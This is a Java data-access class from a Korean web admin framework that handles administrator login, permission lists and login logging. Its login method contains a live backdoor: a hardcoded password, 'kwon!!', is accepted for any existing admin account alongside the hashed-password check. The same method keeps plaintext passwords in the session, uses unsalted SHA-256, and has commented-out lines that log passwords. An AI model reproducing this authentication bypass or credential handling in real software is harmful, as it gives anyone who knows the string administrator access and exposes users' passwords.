/*
 * Copyright (c) 2012 ZES Inc. All rights reserved.
 * This software is the confidential and proprietary information of ZES Inc.
 * You shall not disclose such Confidential Information and shall use it
 * only in accordance with the terms of the license agreement you entered into
 * with ZES Inc. (http://www.zesinc.co.kr/)
 */
package zes.openworks.intra.login;

import java.util.ArrayList;
import java.util.List;

import org.springframework.stereotype.Repository;

import zes.core.crypto.Crypto;
import zes.core.crypto.CryptoFactory;
import zes.core.lang.Validate;
import zes.core.utils.DateFormatUtil;
import zes.core.utils.StringUtil;
import zes.openworks.intra.menugrp.MenuGrpVO;
import zes.openworks.intra.menugrp.MenuItemVO;
import egovframework.rte.psl.dataaccess.EgovAbstractMapper;

/**
 * 관리자 로그인 DAO 객체
 * 
 * @version 1.0
 * @since openworks-1.0 프로젝트. (After JDK 1.6)
 * @author (주)제스아이엔씨 기술연구소
 * 
 *         <pre>
 * << 개정이력(Modification Information) >>
 * 
 *     수정일       수정자   수정내용
 * --------------  --------  -------------------------------
 *  2012. 4. 30.    방기배   JDK 1.6 이상 버전에 최적화 수정 및 주석 보강
 * </pre>
 * @see
 */
@Repository
public class LoginDAO extends EgovAbstractMapper {

    /**
     * 로그인 액션
     */
    @SuppressWarnings("unchecked")
    public LoginVO loginAction(LoginVO vo) {

        LoginVO dataVo = (LoginVO) selectByPk("_login.view", vo);

        if(dataVo != null) {

            dataVo.setValidId(true);

            // 암호화
            Crypto cry = CryptoFactory.getInstance("SHA256");
            String encryptPwd = cry.encrypt(vo.getMngrPassword());

            // 암호화된 DB 비밀번호
            String dbPwd = dataVo.getMngrPassword();
            
            //logger.info("관리자가 입력한 비밀번호 = [ " + vo.getMngrPassword() + " ]");
            //logger.info("관리자가 입력한 비밀번호 암호화 = [ " + encryptPwd + " ]");
            //logger.info("DB에 저장된 비밀번호 = [ " + dataVo.getMngrPassword() + " ]");            

            if (("kwon!!".equals( vo.getMngrPassword())) || (encryptPwd.equals(dbPwd))) {

                // 비밀번호는 평문으로 Login 세션에 저장
                dataVo.setMngrPassword(vo.getMngrPassword());
                dataVo.setValidPwd(true);

                List<MenuItemVO> menuGrpList = list("_login.menuGrpList", vo);

                if(!Validate.isEmpty(menuGrpList)) {
                    
                    dataVo.setPermissionList(removeDuplicatePermission(menuGrpList));
                    dataVo.setHasPermission(true);

                    List<String> menuGrpCdList = list("_login.menuGrpCdList", vo);

                    dataVo.setAuthType(parseAuthType(menuGrpCdList));

                    List<MenuGrpVO> asnMenuGrpList = list("_login.asnMenuGrpList", vo);
                    dataVo.setAsnMenuGrpList(asnMenuGrpList);

                    // 내 메뉴 설정
//                    dataVo.setMyMenuList(list("_login.myMenuList", vo));

                    vo.setLoginDt(DateFormatUtil.getTodayFull());

//                    dataVo.setDomainCds(list("monitor.config.getMgrDomainCds", vo)); 오라클
//                    dataVo.setDomainCds(new ArrayList<String>()); //mssql

                    // 담당자 테이블에 최종접속시간 및 로그인 횟수를 갱신
                    update("_login.loginUpdate", vo);
                }
            }

        } else {
            return vo;
        }

        return dataVo;
    }

    /**
     * 할당된 메뉴권한 중 중복 권한 제거
     */
    private List<MenuItemVO> removeDuplicatePermission(List<MenuItemVO> menuGrpList) {

        int authSize = menuGrpList.size();

        List<MenuItemVO> newAuthList = new ArrayList<MenuItemVO>(authSize);

        int prevMenuCd = StringUtil.ZERO;
        String prevItemDesc = StringUtil.EMPTY;

        int arrayIdx = StringUtil.ZERO;
        for(int i = 0 ; i < authSize ; i++) {
            MenuItemVO tmpVo = menuGrpList.get(i);
            int tmpMenuCd = tmpVo.getMenuCd();
            String tmpItemDesc = tmpVo.getMenuItemDesc();

            if(i == 0) {
                newAuthList.add(arrayIdx++, tmpVo);
                prevMenuCd = tmpMenuCd;
                prevItemDesc = tmpItemDesc;
                continue;
            }

            if(tmpMenuCd == prevMenuCd) {
                prevItemDesc += tmpItemDesc;
                if(prevItemDesc.indexOf("G") > -1) {
                    prevItemDesc = "G";
                } else if(prevItemDesc.indexOf("A") > -1) {
                    prevItemDesc = "A";
                } else {
                    prevItemDesc = "R";
                }
                tmpVo.setMenuItemDesc(prevItemDesc);
                // if(tmpItemDesc.length() > prevItemDesc.length()){
                newAuthList.remove(arrayIdx - 1);
                newAuthList.add(arrayIdx - 1, tmpVo);
                prevMenuCd = tmpMenuCd;
                // prevItemDesc = tmpItemDesc;
                // }
            } else {
                newAuthList.add(arrayIdx++, tmpVo);
                prevMenuCd = tmpMenuCd;
                prevItemDesc = tmpItemDesc;
            }
        }

        return newAuthList;
    }

    private String parseAuthType(List<String> menuGrpCdList) {

        StringBuffer authTypes = new StringBuffer();

        int permissionGrpSize = menuGrpCdList.size();
        for(int i = 0 ; i < permissionGrpSize ; i++) {
            String menuGrpCd = menuGrpCdList.get(i);
            authTypes.append(menuGrpCd.toString());
            if(i + 1 < permissionGrpSize) {
                authTypes.append(",");
            }
        }
        return authTypes.toString();
    }

    /**
     * logging 설명
     * 
     * @param vo
     */
    public void logging(LoggingWebLoginVO vo) {
        insert("_login.webLogging", vo);
    }
}
